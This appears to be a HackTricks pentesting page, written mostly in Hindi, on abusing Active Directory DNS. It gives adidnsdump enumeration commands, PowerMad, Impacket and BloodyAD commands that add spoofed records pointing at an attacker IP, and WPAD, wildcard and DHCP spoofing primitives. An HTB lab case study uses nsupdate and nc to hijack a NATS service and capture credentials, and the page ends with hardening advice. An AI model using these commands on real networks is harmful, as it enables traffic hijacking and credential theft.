# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

डिफ़ॉल्ट रूप से **any user** in Active Directory, Domain या Forest DNS zones में **all DNS records** को **enumerate** कर सकता है, जो zone transfer के समान है (users, AD environment में DNS zone के child objects को list कर सकते हैं)।

[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) tool internal networks के recon purposes के लिए zone में मौजूद **all DNS records** की **enumeration** और **exporting** सक्षम करता है।<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) अब JSON/Greppable (`--json`) output, multi-threaded DNS resolution और LDAPS से binding करते समय TLS 1.2/1.3 का support जोड़ता है

अधिक जानकारी के लिए पढ़ें [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Records बनाना / Modify करना (ADIDNS spoofing)

क्योंकि **Authenticated Users** group को default रूप से zone DACL पर **Create Child** अधिकार प्राप्त है, इसलिए कोई भी domain account (या computer account) additional records register कर सकता है। इसका उपयोग traffic hijacking, NTLM relay coercion या यहां तक कि full domain compromise के लिए किया जा सकता है।

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py, Impacket ≥0.12.0 के साथ आता है)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## सामान्य attack primitives

1. **Wildcard record** – `*.<zone>` AD DNS server को LLMNR/NBNS spoofing के समान enterprise-wide responder में बदल देता है। इसका दुरुपयोग NTLM hashes capture करने या उन्हें LDAP/SMB पर relay करने के लिए किया जा सकता है।  (WINS-lookup disabled होना आवश्यक है।)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – `wpad` जोड़ें (या **NS** record जोड़ें जो Global-Query-Block-List को bypass करने के लिए attacker host की ओर point करता हो) और credentials harvest करने के लिए outbound HTTP requests को transparently proxy करें। Microsoft ने wildcard/ DNAME bypasses (CVE-2018-8320) को patch कर दिया है, लेकिन **NS-records अभी भी काम करते हैं**।<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – उस IP address पर claim करें जो पहले किसी workstation का था; associated DNS entry अभी भी resolve होगी, जिससे DNS को बिल्कुल touch किए बिना resource-based constrained delegation या Shadow-Credentials attacks संभव हो जाते हैं।
4. **DHCP → DNS spoofing** – default Windows DHCP+DNS deployment में उसी subnet पर मौजूद unauthenticated attacker forged DHCP requests भेजकर किसी भी existing A record (जिसमें Domain Controllers भी शामिल हैं) को overwrite कर सकता है। ये requests dynamic DNS updates trigger करती हैं (Akamai “DDSpoof”, 2023)। इससे Kerberos/LDAP पर machine-in-the-middle स्थिति बनती है और full domain takeover हो सकता है।<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – अपने control वाले machine account का `dNSHostName` बदलें, matching A record register करें, फिर उस नाम के लिए certificate request करके DC का impersonation करें। **Certipy** या **BloodyAD** जैसे tools इस flow को पूरी तरह automate करते हैं।

---

### stale dynamic records के माध्यम से Internal service hijacking (NATS case study)

जब dynamic updates सभी authenticated users के लिए खुले रहते हैं, **de-registered service name को फिर से claim करके attacker infrastructure की ओर point किया जा सकता है**। Mirage HTB DC ने DNS scavenging के बाद hostname `nats-svc.mirage.htb` को expose कर दिया, इसलिए कोई भी low-privileged user निम्न कार्य कर सकता था:<sup>[[3]](#references)</sup>

1. **Confirm करें कि record missing है** और `dig` से SOA जानें:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **रिकॉर्ड को फिर से बनाएँ** उस external/VPN interface की ओर जिसे वे नियंत्रित करते हैं:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **plaintext service का impersonate करें**। NATS clients credentials भेजने से पहले एक `INFO { ... }` banner देखने की अपेक्षा करते हैं, इसलिए real broker से एक legitimate banner copy करना secrets harvest करने के लिए पर्याप्त है:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
कोई भी client जो hijacked name को resolve करता है, वह तुरंत अपना JSON `CONNECT` frame (जिसमें `"user"`/`"pass"` शामिल हैं) listener को leak कर देगा। Attacker host पर official `nats-server -V` binary चलाने, उसके log redaction को disable करने, या Wireshark से session को sniff करने पर समान plaintext credentials मिलते हैं, क्योंकि TLS optional था।

4. **Captured creds के साथ Pivot करें** – Mirage में चुराए गए NATS account ने JetStream access प्रदान किया, जिससे historic authentication events उजागर हुए, जिनमें reuse किए जा सकने वाले AD usernames/passwords मौजूद थे।

यह pattern हर उस AD-integrated service पर लागू होता है जो unsecured TCP handshakes (HTTP APIs, RPC, MQTT आदि) पर निर्भर करती है: जैसे ही DNS record hijack होता है, attacker ही service बन जाता है।

---

## Detection और hardening

* Sensitive zones पर **Authenticated Users** को *Create all child objects* right deny करें और dynamic updates को DHCP द्वारा उपयोग किए जाने वाले dedicated account को delegate करें।
* यदि dynamic updates आवश्यक हों, तो zone को **Secure-only** पर सेट करें और DHCP में **Name Protection** enable करें, ताकि केवल owner computer object ही अपना record overwrite कर सके।
* DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) और `CN=MicrosoftDNS,DC=DomainDnsZones` पर LDAP writes को monitor करें।
* Dangerous names (`wpad`, `isatap`, `*`) को intentionally-benign record या Global Query Block List के माध्यम से block करें।
* DNS servers को patched रखें – उदाहरण के लिए, RCE bugs CVE-2024-26224 और CVE-2024-26231 ने **CVSS 9.8** प्राप्त किया और Domain Controllers के विरुद्ध remotely exploitable हैं।

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, wildcard/WPAD attacks के लिए अब भी de-facto reference)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
